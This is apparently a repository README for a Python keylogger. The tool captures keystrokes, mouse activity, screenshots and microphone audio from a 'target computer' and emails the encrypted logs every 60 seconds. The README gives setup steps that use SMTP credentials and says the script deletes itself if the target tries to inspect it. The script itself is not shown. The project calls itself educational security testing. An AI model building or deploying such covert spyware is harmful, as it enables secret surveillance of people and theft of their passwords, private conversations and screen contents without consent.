Update keylogger.py
KeyLogger

Inputs To Mail:
Get Keyboard, Mouse, Screenshot, Microphone Inputs and Send to your Mail. 

The purpose of the project is to test the security of information systems.

Installation:
You don't need to do anything for installation, just run the script.

Usage:
1. Create an account on Mailtrap using a temp mail.
2. Set your own SMTP USERNAME and SMTP PASSWORD in the `keylogger.py` file.
3. Install the required packages:
    ```sh
    pip install -r requirements.txt
    ```
4. Run the keylogger script:
    ```sh
    python3 keylogger.py
    ```
5. Every 60 seconds, you will receive the data from the target computer.

Features:
- Encrypts logs before sending them via email.
- Captures keyboard, mouse, screenshot, and microphone inputs.
- Automatically deletes itself if the target tries to access the script.

Disclaimer:
This project is for educational purposes only. Use it responsibly and only on systems you have permission to test.